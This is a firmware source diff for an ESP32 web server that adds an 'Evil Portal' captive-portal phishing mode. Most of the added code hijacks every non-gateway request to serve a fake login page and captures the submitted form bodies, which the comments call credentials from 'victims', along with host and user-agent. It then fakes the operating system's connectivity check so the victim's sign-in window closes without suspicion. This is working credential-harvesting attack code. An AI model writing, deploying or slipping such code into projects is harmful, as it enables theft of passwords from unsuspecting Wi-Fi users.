@@ -10,6 +10,7 @@
 
 #include <freertos/FreeRTOS.h>
 #include <esp_http_server.h>
+#include "lwip/sockets.h"  // getpeername for captive "release" logic
 #include <freertos/task.h>
 #include <esp_ota_ops.h>
 #include <esp_system.h>
@@ -28,9 +29,60 @@
 #include "pinconfig_html.h"
 #include "MtCompactStructs.hpp"
 #include "RadioStructs.hpp"
+#include "apps/evilportal_bridge.h"
 
 static httpd_handle_t server = NULL;
 static bool disable_esp_async = false;  // for example while in file transfer mode, don't send anything else
+
+// Evil Portal (captive portal) on-system app integration. When active, a
+// wildcard 404 handler serves the portal page and captures form posts, while
+// the management UI stays reachable via http://192.168.4.1.
+static bool g_evilportal_active = false;
+
+// Clients that already submitted credentials are "released": their next OS
+// captive-detection probe gets the expected success response so the phone's
+// captive sign-in window closes cleanly instead of spinning forever.
+#define EP_RELEASED_MAX 8
+static uint32_t g_ep_released[EP_RELEASED_MAX] = {0};
+static uint8_t g_ep_released_n = 0;
+
+static uint32_t evilportal_client_ip(httpd_req_t* req) {
+    int fd = httpd_req_to_sockfd(req);
+    if (fd < 0) return 0;
+    struct sockaddr_in a;  // AP is IPv4-only
+    socklen_t l = sizeof(a);
+    if (getpeername(fd, (struct sockaddr*)&a, &l) != 0) return 0;
+    return a.sin_addr.s_addr;
+}
+static bool evilportal_is_released(uint32_t ip) {
+    if (ip == 0) return false;
+    for (uint8_t i = 0; i < g_ep_released_n; i++)
+        if (g_ep_released[i] == ip) return true;
+    return false;
+}
+static void evilportal_mark_released(uint32_t ip) {
+    if (ip == 0 || evilportal_is_released(ip)) return;
+    if (g_ep_released_n < EP_RELEASED_MAX) {
+        g_ep_released[g_ep_released_n++] = ip;
+    } else {
+        // ring: overwrite oldest
+        memmove(&g_ep_released[0], &g_ep_released[1], (EP_RELEASED_MAX - 1) * sizeof(uint32_t));
+        g_ep_released[EP_RELEASED_MAX - 1] = ip;
+    }
+}
+// Send the OS-expected "online" response so the captive assistant closes.
+static esp_err_t evilportal_send_success(httpd_req_t* req) {
+    if (strstr(req->uri, "generate_204") || strstr(req->uri, "gen_204")) {
+        httpd_resp_set_status(req, "204 No Content");
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        return httpd_resp_send(req, NULL, 0);
+    }
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    static const char* success = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
+    return httpd_resp_send(req, success, HTTPD_RESP_USE_STRLEN);
+}
+static esp_err_t evilportal_serve_portal(httpd_req_t* req);
 
 #define INDEX_HTML_PATH "/spiffs/index.html"
 #define SETUP_HTML_PATH "/spiffs/setup.html"
@@ -193,6 +245,17 @@ static esp_err_t get_req_handler_pinconfig(httpd_req_t* req) {
 
 // root / get handler.
 static esp_err_t get_req_handler(httpd_req_t* req) {
+    // When the Evil Portal is active, only the operator hitting the gateway
+    // directly (http://192.168.4.1) gets the management UI. Any other Host
+    // (a victim's captive-detection request to some random domain) gets the
+    // portal page instead.
+    if (g_evilportal_active) {
+        char host[64] = {0};
+        httpd_req_get_hdr_value_str(req, "Host", host, sizeof(host));
+        if (strstr(host, "192.168.4.1") == NULL) {
+            return evilportal_serve_portal(req);
+        }
+    }
     // pinConfig.debugPrint();
     if (pinConfig.isPinsOk()) {
         const uint32_t index_len = index_end - index_start;
@@ -744,10 +807,103 @@ static esp_err_t handle_ws_req(httpd_req_t* req) {
     return ESP_OK;
 }
 
+// ---- Evil Portal captive HTTP integration ----------------------------------
+
+// Serve the currently selected portal page (200 text/html).
+static esp_err_t evilportal_serve_portal(httpd_req_t* req) {
+    size_t html_len = 0;
+    const char* html = evilportal_get_portal_html(&html_len);
+    if (html == NULL || html_len == 0) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "no portal");
+        return ESP_FAIL;
+    }
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    return httpd_resp_send(req, html, html_len);
+}
+
+// Wildcard catch-all: every unmatched URI ends up here while the portal is
+// active. GET -> show the portal; POST (the login form) -> capture and show a
+// short "connecting" page.
+static esp_err_t evilportal_404_handler(httpd_req_t* req, httpd_err_code_t err) {
+    (void)err;
+    if (!g_evilportal_active) {
+        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not found");
+        return ESP_FAIL;
+    }
+
+    if (req->method == HTTP_POST) {
+        char host[64] = {0};
+        char ua[128] = {0};
+        httpd_req_get_hdr_value_str(req, "Host", host, sizeof(host));
+        httpd_req_get_hdr_value_str(req, "User-Agent", ua, sizeof(ua));
+
+        int total = req->content_len;
+        if (total > 1024) total = 1024;  // creds are tiny; cap the read
+        std::string body;
+        body.reserve(total);
+        char buf[256];
+        int remaining = total;
+        while (remaining > 0) {
+            int r = httpd_req_recv(req, buf, MIN(remaining, (int)sizeof(buf)));
+            if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
+            if (r <= 0) break;
+            body.append(buf, r);
+            remaining -= r;
+        }
+        // drain anything above the cap so the socket stays clean
+        int drain = req->content_len - total;
+        while (drain > 0) {
+            int r = httpd_req_recv(req, buf, MIN(drain, (int)sizeof(buf)));
+            if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
+            if (r <= 0) break;
+            drain -= r;
+        }
+
+        evilportal_on_capture(body.c_str(), body.size(), host, ua);
+
+        // Release this client: its next captive-detection probe gets "success"
+        // so the sign-in window closes.
+        evilportal_mark_released(evilportal_client_ip(req));
+
+        static const char* thanks =
+            "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
+            "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
+            "<title>Connected</title><style>body{font-family:Arial,sans-serif;"
+            "text-align:center;margin-top:20vh;color:#444}</style></head><body>"
+            "<h2>You are connected</h2><p>Enjoy the WiFi.</p></body></html>";
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        return httpd_resp_send(req, thanks, HTTPD_RESP_USE_STRLEN);
+    }
+
+    // A client that already submitted gets the OS "online" response so the
+    // captive assistant closes; everyone else gets the portal page.
+    if (evilportal_is_released(evilportal_client_ip(req))) {
+        return evilportal_send_success(req);
+    }
+    return evilportal_serve_portal(req);
+}
+
+extern "C" bool evilportal_http_is_active(void) {
+    return g_evilportal_active;
+}
+
+extern "C" void evilportal_http_set_active(bool active) {
+    g_evilportal_active = active;
+    if (active) g_ep_released_n = 0;  // fresh portal session, no released clients yet
+    if (server == NULL) return;
+    if (active) {
+        httpd_register_err_handler(server, HTTPD_404_NOT_FOUND, evilportal_404_handler);
+    } else {
+        httpd_register_err_handler(server, HTTPD_404_NOT_FOUND, NULL);
+    }
+}
+
 // config web server part
 static httpd_handle_t setup_websocket_server(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    config.max_uri_handlers = 10;
+    config.max_uri_handlers = 12;  // 11 handlers are registered below
     config.max_open_sockets = 10;
     config.stack_size = 8192;
 
